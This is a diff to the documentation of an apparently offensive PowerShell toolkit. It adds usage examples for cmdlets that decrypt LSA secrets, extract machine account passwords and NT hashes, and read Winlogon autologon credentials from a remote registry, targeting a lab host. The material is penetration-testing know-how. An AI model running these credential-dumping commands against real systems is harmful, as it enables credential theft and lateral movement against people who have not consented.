@@ -330,6 +330,32 @@ Derives the boot key (syskey) and LSA encryption key from the remote registry.
 Get-TBORegLsaKeys -ServerName corp1-web01.corp1.lab.home-labs.lol
 ```
 
+#### Get-TBORegLsaSecrets
+
+Decrypts LSA secrets from the remote registry using the derived LSA key.
+
+```powershell
+Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol
+Get-TBORegLsaSecrets -ServerName corp1-web01.corp1.lab.home-labs.lol -Name 'NL$KM'
+```
+
+#### Get-TBORegMachineAccount
+
+Decrypts the $MACHINE.ACC secret and returns the machine account password and NT hash.
+
+```powershell
+Get-TBORegMachineAccount -ServerName corp1-web01.corp1.lab.home-labs.lol
+Get-TBORegLsaKeys -ServerName corp1-web01.corp1.lab.home-labs.lol | Get-TBORegMachineAccount
+```
+
+#### Get-TBORegAutoLogon
+
+Reads autologon configuration values from the Winlogon registry key.
+
+```powershell
+Get-TBORegAutoLogon -ServerName corp1-web01.corp1.lab.home-labs.lol
+```
+
 #### Get-TBORegSamHashes
 
 Derives local SAM account hashes using the remote registry (backup semantics required).
